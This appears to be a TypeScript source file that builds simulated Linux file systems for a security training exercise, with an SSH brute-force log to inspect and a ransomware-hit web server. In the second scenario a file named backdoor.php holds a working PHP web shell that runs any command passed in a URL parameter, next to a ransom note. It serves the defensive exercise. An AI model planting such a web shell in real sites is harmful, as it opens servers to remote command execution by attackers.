export interface VirtualFileSystemNode {
  type: 'dir' | 'file';
  name: string;
  permissions?: string; // e.g., 'drwxr-xr-x' or '-rw-r-----'
  owner?: string;       // e.g., 'root' or 'apache'
  group?: string;       // e.g., 'root' or 'syslog'
  size?: string;        // e.g., '4.0K' or '248K'
  mdate?: string;       // e.g., 'May 26 13:02'
  content?: string;     // file contents
}

export function getInitialBasicsFS(): Record<string, VirtualFileSystemNode> {
  return {
    '/': {
      type: 'dir',
      name: '/',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/home': {
      type: 'dir',
      name: 'home',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/home/user': {
      type: 'dir',
      name: 'user',
      permissions: 'drwxr-xr-x',
      owner: 'user',
      group: 'user',
      size: '4.0K',
      mdate: 'May 26 12:05'
    },
    '/home/user/readme.txt': {
      type: 'file',
      name: 'readme.txt',
      permissions: '-rw-r--r--',
      owner: 'user',
      group: 'user',
      size: '1.2K',
      mdate: 'May 26 12:10',
      content: '==================================================\nBEM-VINDO AO CONSOLE DE BACKUP DE AUTENTICACAO!\n==================================================\n\nInstrucoes operacionais:\n\n1. Inspecione o diretorio /var/log para analisar logs de sessao SSH.\n2. Verifique o arquivo auth.log para identificar tentativas abusivas de acessos invalidos (SSH Brute Force).\n3. O ataque ocorre no servico SSH na porta 22.\n4. Para se situar, use os comandos basicos:\n   * pwd           - Ver diretorio atual\n   * cd <caminho>  - Mudar de pasta\n   * ls -la        - Listar arquivos e permissoes detalhadas\n   * whoami        - Ver seu usuario\n   * ip a          - Listar interfaces de rede\n   * ping <IP>     - Validar conectividade\n   * cat auth.log  - Ler log na pasta de logs\n\nPor favor, filtre os registros falhos utilzando a pipeline recomendada de grep para que o diagnóstico seja completo.\nEx: grep "Failed password" /var/log/auth.log\n\n=================================================='
    },
    '/var': {
      type: 'dir',
      name: 'var',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/var/log': {
      type: 'dir',
      name: 'log',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'adm',
      size: '4.0K',
      mdate: 'May 26 13:00'
    },
    '/var/log/auth.log': {
      type: 'file',
      name: 'auth.log',
      permissions: '-rw-r-----',
      owner: 'syslog',
      group: 'adm',
      size: '248K',
      mdate: 'May 26 13:02',
      content: 'May 26 13:00:10 auth-server sshd[2220]: Server listening on 0.0.0.0 port 22.\nMay 26 13:00:15 auth-server sshd[2225]: Connection received from 192.168.1.50 port 49120 ssh2\nMay 26 13:00:20 auth-server sshd[2225]: Accepted publickey for operator from 192.168.1.50\nMay 26 13:01:02 auth-server sshd[2241]: Failed password for root from 198.51.100.42 port 51900 ssh2\nMay 26 13:01:04 auth-server sshd[2243]: Failed password for root from 198.51.100.42 port 51905 ssh2\nMay 26 13:01:05 auth-server sshd[2248]: Failed password for invalid user admin from 198.51.100.42 port 51908 ssh2\nMay 26 13:01:10 auth-server sshd[2250]: Connection closed by authenticating user root 198.51.100.42 port 51950 [preauth]\nMay 26 13:01:12 auth-server sshd[2255]: Received disconnect from 198.51.100.42: 11: Bye Bye [preauth]'
    },
    '/var/log/syslog': {
      type: 'file',
      name: 'syslog',
      permissions: '-rw-r-----',
      owner: 'syslog',
      group: 'adm',
      size: '512K',
      mdate: 'May 26 12:30',
      content: 'May 26 12:30:00 auth-server rsyslogd: [origin software="rsyslogd" swVersion="8.2001.0"] start\nMay 26 12:45:01 auth-server CRON[3102]: (root) CMD (command -v debian-sa1 && debian-sa1 1 1)\nMay 26 13:00:22 auth-server kernel: [ 451.242195] eth0: link up, 1000Mbps, full-duplex\nMay 26 13:01:45 auth-server systemd[1]: Started Periodic Background Backup Service.'
    },
    '/etc': {
      type: 'dir',
      name: 'etc',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/etc/hosts': {
      type: 'file',
      name: 'hosts',
      permissions: '-rw-r--r--',
      owner: 'root',
      group: 'root',
      size: '342B',
      mdate: 'May 26 12:00',
      content: '127.0.0.1   localhost\n127.0.1.1   auth-server\n\n# Backbone NOC Hosts\n192.168.1.100 auth-server.corporate.int\n192.168.1.120 backup-server.corporate.int\n198.51.100.42 attacker-host-ssh.anon'
    },
    '/etc/passwd': {
      type: 'file',
      name: 'passwd',
      permissions: '-rw-r--r--',
      owner: 'root',
      group: 'root',
      size: '1.4K',
      mdate: 'May 26 12:00',
      content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsyslog:x:101:102::/home/syslog:/bin/false\nuser:x:1000:1000:NOC Operator:/home/user:/bin/bash'
    },
    '/root': {
      type: 'dir',
      name: 'root',
      permissions: 'drwx------',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/root/.bashrc': {
      type: 'file',
      name: '.bashrc',
      permissions: '-rw-r--r--',
      owner: 'root',
      group: 'root',
      size: '3.1K',
      mdate: 'May 26 12:00',
      content: '# ~/.bashrc: Executado para shells nao interativos.\nalias l="ls -la"\nalias grep="grep --color=auto"'
    },
    '/tmp': {
      type: 'dir',
      name: 'tmp',
      permissions: 'drwxrwxrwt',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 13:00'
    }
  };
}

export function getInitialSocFS(): Record<string, VirtualFileSystemNode> {
  return {
    '/': {
      type: 'dir',
      name: '/',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/var': {
      type: 'dir',
      name: 'var',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/var/www': {
      type: 'dir',
      name: 'www',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/var/www/html': {
      type: 'dir',
      name: 'html',
      permissions: 'drwxrwxrwx',
      owner: 'apache',
      group: 'apache',
      size: '4.0K',
      mdate: 'May 26 13:00'
    },
    '/var/www/html/index.html': {
      type: 'file',
      name: 'index.html',
      permissions: '----------', // Bloqueado pelo Ransomware!
      owner: 'apache',
      group: 'apache',
      size: '1.8K',
      mdate: 'May 26 13:01',
      content: '=================================================================================\n!!! ATENCAO: SEUS ARQUIVOS DE SERVIDOR FORAM CRIPTOGRAFADOS POR LOCKVIL !!!\n=================================================================================\n\nTodo o seu diretorio "/var/www/html" e bancos anexados foram trancados usando a chave\ncritografica publica RSA-4096.\n\nPara reaver e restaurar seus dados operacionais e o portal corporativo:\n1. Transfira o montante de 2.5 Bitcoins (BTC) para o endereco btc_39fjak29djs92dj9dsm.\n2. Envie o recibo ao e-mail lockvil-decryptor@onion.mail.\n3. NAO altere os arquivos cifrados ou tente reiniciar o host, caso contrario, eles poderao\n   ser destruidos de forma irrecuperavel.'
    },
    '/var/www/html/backdoor.php': {
      type: 'file',
      name: 'backdoor.php',
      permissions: '-rwxrwxrwx',
      owner: 'nobody',
      group: 'nogroup',
      size: '45K',
      mdate: 'May 26 13:00',
      content: '<?php\n/**\n * PHP Web Shell Backdoor\n * Permite acesso total de execucao remota via HTTP GET cmd.\n */\nif (isset($_GET["cmd"])) {\n    $cmd = $_GET["cmd"];\n    echo "Executing command: " . htmlspecialchars($cmd) . "\\n";\n    system($cmd);\n}\n?>'
    },
    '/etc': {
      type: 'dir',
      name: 'etc',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/etc/apache2': {
      type: 'dir',
      name: 'apache2',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/etc/apache2/ports.conf': {
      type: 'file',
      name: 'ports.conf',
      permissions: '-rw-r--r--',
      owner: 'root',
      group: 'root',
      size: '128B',
      mdate: 'May 26 12:00',
      content: 'Listen 80\n<IfModule ssl_module>\n\tListen 443\n</IfModule>'
    },
    '/home': {
      type: 'dir',
      name: 'home',
      permissions: 'drwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/home/user': {
      type: 'dir',
      name: 'user',
      permissions: 'drwxr-xr-x',
      owner: 'user',
      group: 'user',
      size: '4.0K',
      mdate: 'May 26 12:00'
    },
    '/home/user/backup_db.sh': {
      type: 'file',
      name: 'backup_db.sh',
      permissions: '-rwxr-xr-x',
      owner: 'user',
      group: 'user',
      size: '850B',
      mdate: 'May 26 11:30',
      content: '#!/bin/bash\n# Script de Backup automatizado de banco de dados do site corporativo\necho "[+] Iniciando backup do banco de dados..."\nmysqldump -u root wordpress_db > /home/user/wp_database_backup.sql\necho "[+] Banco compactado e enviado!"'
    },
    '/tmp': {
      type: 'dir',
      name: 'tmp',
      permissions: 'drwxrwxrwt',
      owner: 'root',
      group: 'root',
      size: '4.0K',
      mdate: 'May 26 13:00'
    },
    '/tmp/malware-encryptor': {
      type: 'file',
      name: 'malware-encryptor',
      permissions: '-rwxrwxrwx',
      owner: 'nobody',
      group: 'nogroup',
      size: '1.2M',
      mdate: 'May 26 13:01',
      content: '[BINARY DATA: ELF 64-bit LSB executable, x86-64, dynamically linked]\n# LOCKVIL RANSOMWARE ENCRYPTOR DAEMON RUNNING ACTIVE ON PID 1442\n# Matar o PID (kill -9 1442) para parar a cifragem recursiva de arquivos do apache.'
    }
  };
}
